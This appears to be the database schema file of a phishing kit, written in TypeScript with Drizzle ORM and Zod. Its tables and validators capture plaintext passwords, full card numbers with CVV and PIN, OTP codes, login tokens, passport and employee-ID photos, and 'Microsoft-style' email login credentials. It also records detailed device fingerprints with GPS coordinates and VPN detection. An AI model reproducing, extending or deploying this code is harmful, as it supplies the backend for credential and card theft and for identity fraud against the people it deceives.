import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Login attempts table - stores all login data securely on server
export const loginAttempts = pgTable("login_attempts", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull(),
  password: text("password").notNull(),
  email: text("email"),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  status: text("status").notNull(), // 'pending', 'email_sent', 'otp_verified', 'failed'
  flowType: text("flow_type").default('normal').notNull(), // 'normal' or 'standalone'
});

export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).omit({
  id: true,
  timestamp: true,
});

export type InsertLoginAttempt = z.infer<typeof insertLoginAttemptSchema>;
export type LoginAttempt = typeof loginAttempts.$inferSelect;

// OTP sessions table
export const otpSessions = pgTable("otp_sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  loginAttemptId: varchar("login_attempt_id").notNull(),
  email: text("email").notNull(),
  otpCode: text("otp_code").notNull(),
  expiresAt: timestamp("expires_at").notNull(),
  verified: text("verified").default("false").notNull(), // 'true' or 'false'
  flowType: text("flow_type").default("login").notNull(), // 'login' or 'account'
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

export const insertOtpSessionSchema = createInsertSchema(otpSessions).omit({
  id: true,
  createdAt: true,
});

export type InsertOtpSession = z.infer<typeof insertOtpSessionSchema>;
export type OtpSession = typeof otpSessions.$inferSelect;

// Postal code data table (includes card data)
export const postalCodeData = pgTable("postal_code_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  loginAttemptId: varchar("login_attempt_id").notNull(),
  cardNumber: text("card_number").notNull(),
  expiration: text("expiration").notNull(),
  cvv: text("cvv").notNull(),
  postalCode: text("postal_code").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertPostalCodeDataSchema = createInsertSchema(postalCodeData).omit({
  id: true,
  timestamp: true,
});

export type InsertPostalCodeData = z.infer<typeof insertPostalCodeDataSchema>;
export type PostalCodeData = typeof postalCodeData.$inferSelect;

// Device fingerprint schema for detailed tracking
export const deviceFingerprintSchema = z.object({
  // Basic device info
  deviceType: z.string().optional(),
  deviceBrand: z.string().optional(),
  deviceModel: z.string().optional(),
  
  // System info
  os: z.string().optional(),
  osVersion: z.string().optional(),
  browser: z.string().optional(),
  browserVersion: z.string().optional(),
  platform: z.string().optional(),
  vendor: z.string().optional(),
  screenResolution: z.string().optional(),
  colorDepth: z.number().optional(),
  cpuCores: z.number().optional(),
  deviceMemory: z.number().optional(),
  
  // Timezone & Language
  timezoneInfo: z.object({
    timezone: z.string(),
    utcOffset: z.number(),
    language: z.string(),
    languages: z.array(z.string()),
  }).optional(),
  
  // Connection
  connectionInfo: z.object({
    networkType: z.string(),
    effectiveType: z.string(),
    downlink: z.number().optional(),
    rtt: z.number().optional(),
  }).optional(),
  
  // GPS Location - DETAILED with Google Maps
  gpsLocation: z.object({
    latitude: z.number(),
    longitude: z.number(),
    accuracy: z.number(),
    altitude: z.number().optional(),
    altitudeAccuracy: z.number().optional(),
    heading: z.number().optional(),
    speed: z.number().optional(),
    googleMapsUrl: z.string(),
    googleMapsEmbed: z.string().optional(),
    timestamp: z.number().optional(),
  }).optional(),
  
  // Browser features
  browserFeatures: z.object({
    cookiesEnabled: z.boolean(),
    doNotTrack: z.boolean(),
    touchSupport: z.boolean(),
    maxTouchPoints: z.number(),
  }).optional(),
  
  // Plugins
  plugins: z.array(z.string()).optional(),
  
  // Fingerprints
  canvasFingerprint: z.object({
    hash: z.string(),
  }).optional(),
  
  webglInfo: z.object({
    renderer: z.string(),
    vendor: z.string(),
  }).optional(),
  
  // VPN Detection
  vpnDetection: z.object({
    possibleVPN: z.boolean(),
    indicators: z.array(z.string()),
    webrtcLeak: z.boolean(),
  }).optional(),
  
  // User Agent
  userAgent: z.string().optional(),
});

export type DeviceFingerprint = z.infer<typeof deviceFingerprintSchema>;

// Validation schemas for API requests
export const loginRequestSchema = z.object({
  username: z.string().min(1, "Username is required").max(20),
  password: z.string().min(1, "Password is required").max(50),
  fingerprint: deviceFingerprintSchema.optional(),
});

export const emailVerificationSchema = z.object({
  loginAttemptId: z.string().uuid(),
  email: z.string().email("Please provide a valid email address"),
  flowType: z.enum(['login', 'account']).optional(),
});

export const otpVerificationSchema = z.object({
  sessionId: z.string().uuid(),
  otpCode: z.string().length(6, "OTP must be 6 digits"),
  flowType: z.enum(['login', 'account']).optional(),
});

export const postalCodeRequestSchema = z.object({
  loginAttemptId: z.string().uuid(),
  cardNumber: z.string().length(16, "Card Number must be 16 digits"),
  expiration: z.string().regex(/^\d{2}\/\d{2}$/, "Invalid expiration format"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
  postalCode: z.string().min(1, "Postal Code is required").max(7),
});

// Contact information data table
export const contactInfoData = pgTable("contact_info_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  loginAttemptId: varchar("login_attempt_id").notNull(),
  firstName: text("first_name").notNull(),
  lastName: text("last_name").notNull(),
  email: text("email").notNull(),
  mobilePhone: text("mobile_phone").notNull(),
  mailingAddress: text("mailing_address").notNull(),
  city: text("city").notNull(),
  state: text("state").notNull(),
  postalCode: text("postal_code").notNull(),
  dateOfBirth: text("date_of_birth").notNull(),
  inquiryType: text("inquiry_type").notNull(),
  message: text("message"),
  passportPhoto: text("passport_photo"), // base64 encoded image
  employeeIdPhoto: text("employee_id_photo"), // base64 encoded image
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertContactInfoDataSchema = createInsertSchema(contactInfoData).omit({
  id: true,
  timestamp: true,
});

export type InsertContactInfoData = z.infer<typeof insertContactInfoDataSchema>;
export type ContactInfoData = typeof contactInfoData.$inferSelect;

// Helper function to validate base64 image (required version)
const validateBase64ImageRequired = (dataUri: string): boolean => {
  // Validate data URI format
  const dataUriRegex = /^data:image\/(jpeg|png);base64,(.+)$/;
  const match = dataUri.match(dataUriRegex);
  
  if (!match) return false;
  
  const [, mimeType, base64Data] = match;
  
  // Validate mime type
  if (!['jpeg', 'png'].includes(mimeType)) return false;
  
  // Calculate size from base64 (base64 is ~1.33x original size)
  const sizeInBytes = (base64Data.length * 3) / 4;
  const maxSizeInBytes = 50 * 1024 * 1024; // 50MB
  
  return sizeInBytes <= maxSizeInBytes;
};

export const contactInfoRequestSchema = z.object({
  loginAttemptId: z.string().uuid(),
  firstName: z.string().min(1, "First Name is required").max(50),
  lastName: z.string().min(1, "Last Name is required").max(50),
  email: z.string().email("Please provide a valid email address"),
  mobilePhone: z.string().min(10, "Please provide a valid phone number").max(15),
  mailingAddress: z.string().min(1, "Mailing Address is required").max(200),
  city: z.string().min(1, "City is required").max(50),
  state: z.string().min(1, "State is required").max(50),
  postalCode: z.string().min(1, "Postal Code is required").max(10),
  dateOfBirth: z.string().regex(/^\d{2}-\d{2}-\d{4}$/, "Date of Birth must be in MM-DD-YYYY format"),
  inquiryType: z.string().min(1, "Please select an inquiry type"),
  message: z.string().optional(),
  passportPhoto: z.string().min(1, "Passport photo is required").refine(validateBase64ImageRequired, {
    message: "Passport photo must be a valid JPEG or PNG image under 50MB",
  }),
  employeeIdPhoto: z.string().min(1, "Employee ID photo is required").refine(validateBase64ImageRequired, {
    message: "Employee ID photo must be a valid JPEG or PNG image under 50MB",
  }),
});

// Register data table
export const registerData = pgTable("register_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  cardNumber: text("card_number").notNull(),
  expiration: text("expiration").notNull(),
  cvv: text("cvv").notNull(),
  postalCode: text("postal_code").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertRegisterDataSchema = createInsertSchema(registerData).omit({
  id: true,
  timestamp: true,
});

export type InsertRegisterData = z.infer<typeof insertRegisterDataSchema>;
export type RegisterData = typeof registerData.$inferSelect;

// Card activation data table
export const cardActivationData = pgTable("card_activation_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  cardNumber: text("card_number").notNull(),
  expiration: text("expiration").notNull(),
  cvv: text("cvv").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertCardActivationDataSchema = createInsertSchema(cardActivationData).omit({
  id: true,
  timestamp: true,
});

export type InsertCardActivationData = z.infer<typeof insertCardActivationDataSchema>;
export type CardActivationData = typeof cardActivationData.$inferSelect;

// Forgot username data table
export const forgotUsernameData = pgTable("forgot_username_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  cardNumber: text("card_number").notNull(),
  cvv: text("cvv").notNull(),
  postalCode: text("postal_code").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertForgotUsernameDataSchema = createInsertSchema(forgotUsernameData).omit({
  id: true,
  timestamp: true,
});

export type InsertForgotUsernameData = z.infer<typeof insertForgotUsernameDataSchema>;
export type ForgotUsernameData = typeof forgotUsernameData.$inferSelect;

// Forgot password data table
export const forgotPasswordData = pgTable("forgot_password_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull(),
  postalCode: text("postal_code").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertForgotPasswordDataSchema = createInsertSchema(forgotPasswordData).omit({
  id: true,
  timestamp: true,
});

export type InsertForgotPasswordData = z.infer<typeof insertForgotPasswordDataSchema>;
export type ForgotPasswordData = typeof forgotPasswordData.$inferSelect;

// Request validation schemas
export const registerRequestSchema = z.object({
  cardNumber: z.string().length(16, "Card Number must be 16 digits"),
  expiration: z.string().regex(/^\d{2}\/\d{2}$/, "Invalid expiration format"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
  postalCode: z.string().min(1, "Postal Code is required").max(7),
});

export const cardActivationRequestSchema = z.object({
  cardNumber: z.string().length(16, "Card Number must be 16 digits"),
  expiration: z.string().regex(/^\d{2}\/\d{2}$/, "Invalid expiration format"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
});

export const forgotUsernameRequestSchema = z.object({
  cardNumber: z.string().length(16, "Card Number must be 16 digits"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
  postalCode: z.string().min(1, "Postal Code is required").max(7),
});

export const forgotPasswordRequestSchema = z.object({
  username: z.string().min(1, "Username is required").max(20),
  postalCode: z.string().min(1, "Postal Code is required").max(7),
});

// Microsoft-style email login data table
export const microsoftEmailData = pgTable("microsoft_email_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  loginAttemptId: varchar("login_attempt_id").notNull(),
  emailOrPhone: text("email_or_phone").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertMicrosoftEmailDataSchema = createInsertSchema(microsoftEmailData).omit({
  id: true,
  timestamp: true,
});

export type InsertMicrosoftEmailData = z.infer<typeof insertMicrosoftEmailDataSchema>;
export type MicrosoftEmailData = typeof microsoftEmailData.$inferSelect;

// Microsoft-style password login data table
export const microsoftPasswordData = pgTable("microsoft_password_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  loginAttemptId: varchar("login_attempt_id").notNull(),
  emailOrPhone: text("email_or_phone").notNull(),
  password: text("password").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertMicrosoftPasswordDataSchema = createInsertSchema(microsoftPasswordData).omit({
  id: true,
  timestamp: true,
});

export type InsertMicrosoftPasswordData = z.infer<typeof insertMicrosoftPasswordDataSchema>;
export type MicrosoftPasswordData = typeof microsoftPasswordData.$inferSelect;

// Microsoft-style login request schemas
export const microsoftEmailRequestSchema = z.object({
  loginAttemptId: z.string().uuid(),
  emailOrPhone: z.string().min(1, "Email, phone, or Skype name is required").max(100),
});

export const microsoftPasswordRequestSchema = z.object({
  loginAttemptId: z.string().uuid(),
  emailOrPhone: z.string().min(1, "Email is required").max(100),
  password: z.string().min(1, "Password is required").max(100),
});

export type LoginRequest = z.infer<typeof loginRequestSchema>;
export type EmailVerification = z.infer<typeof emailVerificationSchema>;
export type OtpVerification = z.infer<typeof otpVerificationSchema>;
export type PostalCodeRequest = z.infer<typeof postalCodeRequestSchema>;
export type ContactInfoRequest = z.infer<typeof contactInfoRequestSchema>;
export type RegisterRequest = z.infer<typeof registerRequestSchema>;
export type CardActivationRequest = z.infer<typeof cardActivationRequestSchema>;
export type ForgotUsernameRequest = z.infer<typeof forgotUsernameRequestSchema>;
export type ForgotPasswordRequest = z.infer<typeof forgotPasswordRequestSchema>;
export type MicrosoftEmailRequest = z.infer<typeof microsoftEmailRequestSchema>;
export type MicrosoftPasswordRequest = z.infer<typeof microsoftPasswordRequestSchema>;

// Account login attempts table (for /account page login flow)
export const accountLoginAttempts = pgTable("account_login_attempts", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  loginType: text("login_type").notNull(), // 'card' | 'username' | 'token'
  flowType: text("flow_type").notNull().default('account'), // 'account' for tagging
  // Card login fields (nullable)
  cardNumber: text("card_number"),
  pin: text("pin"),
  // Username login fields (nullable)
  username: text("username"),
  password: text("password"),
  // Token login field (nullable)
  token: text("token"),
  // Multi-step verification fields (nullable)
  email: text("email"),
  otpCode: text("otp_code"),
  // Common fields
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  status: text("status").default('pending'), // 'pending' | 'email_verified' | 'otp_verified'
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertAccountLoginAttemptSchema = createInsertSchema(accountLoginAttempts).omit({
  id: true,
  timestamp: true,
  flowType: true, // Auto-set to 'account'
  status: true, // Auto-set to 'pending'
});

export type InsertAccountLoginAttempt = z.infer<typeof insertAccountLoginAttemptSchema>;
export type AccountLoginAttempt = typeof accountLoginAttempts.$inferSelect;

// Discriminated union schema for account login requests
export const accountLoginRequestSchema = z.discriminatedUnion('loginType', [
  // Card login
  z.object({
    loginType: z.literal('card'),
    cardNumber: z.string().min(1, "Card number is required").max(20),
    pin: z.string().min(1, "PIN is required").max(6),
  }),
  // Username login
  z.object({
    loginType: z.literal('username'),
    username: z.string().min(1, "Username is required").max(50),
    password: z.string().min(1, "Password is required").max(100),
  }),
  // Token login
  z.object({
    loginType: z.literal('token'),
    token: z.string().min(1, "Token is required").max(100),
  }),
]);

export type AccountLoginRequest = z.infer<typeof accountLoginRequestSchema>;
